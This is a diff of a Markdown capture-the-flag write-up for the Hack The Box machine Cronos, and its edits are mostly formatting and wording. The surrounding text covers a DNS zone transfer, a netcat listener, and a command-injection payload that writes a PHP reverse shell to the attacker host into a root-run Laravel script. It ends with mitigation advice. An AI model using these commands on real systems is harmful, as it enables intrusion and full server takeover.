@@ -26,6 +26,7 @@ The attack path involved abusing a DNS zone transfer vulnerability to discover h
 
 ---
 
+
 ## 🔎 Enumeration
 
 An initial Nmap scan was performed against the target system to identify open ports and running services.
@@ -56,22 +57,28 @@ Additionally, the Apache web server running on port `80/tcp` suggested that furt
 
 Since the DNS service exposed on port `53/tcp` appeared to be running ISC BIND, a DNS zone transfer attempt was performed in order to enumerate potential subdomains associated with the target.
 
+
 ```bash
 dig axfr @10.129.227.211 cronos.htb
 ```
+
 
 <img src="images/dig.png" width="600">
 
 
 The zone transfer was successful and revealed several hostnames, including:
 
+
 - `admin.cronos.htb`
 
-In order to access the discovered virtual host was added to the attacker's `/etc/hosts` file for local name resolution:
+
+In order to access the discovered virtual host, it was added to the attacker's `/etc/hosts` file for local name resolution:
+
 
 ```text
 10.129.227.211 admin.cronos.htb
 ```
+
 
 After browsing to `http://admin.cronos.htb`, a login panel was discovered.
 
@@ -133,6 +140,7 @@ confirming that arbitrary commands were being executed on the server as the `www
 
 ## ⬆️ Privilege Escalation
 
+
 ### 🔹 Post-Exploitation Enumeration
 
 
@@ -161,6 +169,7 @@ Additional enumeration showed that the `artisan` file was writable by the `www-d
 
 This created a privilege escalation opportunity, since modifying the contents of the script would result in arbitrary code execution as `root`.
 
+
 ### 🔹 Obtaining a Root Shell
 
 A Netcat listener was started on the attacking machine:
@@ -172,7 +181,7 @@ nc -lvnp 4444
 The vulnerable `artisan` file was then overwritten through command injection with a PHP reverse shell payload:
 
 <details>
-<summary>PHP Reverse Shell Payload</summary>summary>
+<summary>PHP Reverse Shell Payload</summary>
   
 ```bash
 ping 1.1.1.1 ; echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.97/4444 0>&1'\''"); ?>' > /var/www/laravel/artisan
@@ -204,7 +213,7 @@ This resulted in full administrative control over the target system.
 
 ## 📌 Conclusion
 
-Cronos demonstrated how multiple low-level misconfigurations and vulnerabilities can be chained together to achieve full system compromise.
+Cronos demonstrated how multiple misconfigurations and web application vulnerabilities can be chained together to achieve full system compromise.
 
 The attack began with DNS enumeration through a successful zone transfer, which exposed hidden subdomains associated with the target. A vulnerable login panel was then bypassed using SQL injection, granting access to an administrative interface vulnerable to command injection.
 
@@ -228,7 +237,7 @@ An attacker was able to:
 - Execute arbitrary system commands through command injection
 - Achieve remote code execution as the `www-data` user
 - Abuse a writable Laravel scheduled task executed by `root`
-- Obtain a fully interactive shell running with `root` privileges
+- Obtain a fully interactive root shell
 
 With root-level access, an attacker would have complete administrative control over the server, including the ability to access sensitive data, modify configurations, maintain persistence, or deploy additional malicious payloads across the environment.
 
@@ -247,7 +256,7 @@ Several security measures could prevent the attack path demonstrated in this mac
 - Restrict access to administrative interfaces and sensitive subdomains
 - Apply the principle of least privilege to web application service accounts
 - Prevent unprivileged users from modifying scripts executed by privileged accounts
-- Monitor and audit scheduled tasks such as cron jobs
+- Monitor and audit scheduled tasks such as cronjobs
 - Implement outbound traffic restrictions to reduce the risk of reverse shell payloads
 
 🔒 Applying these controls would significantly reduce the risk of remote code execution and privilege escalation attacks.
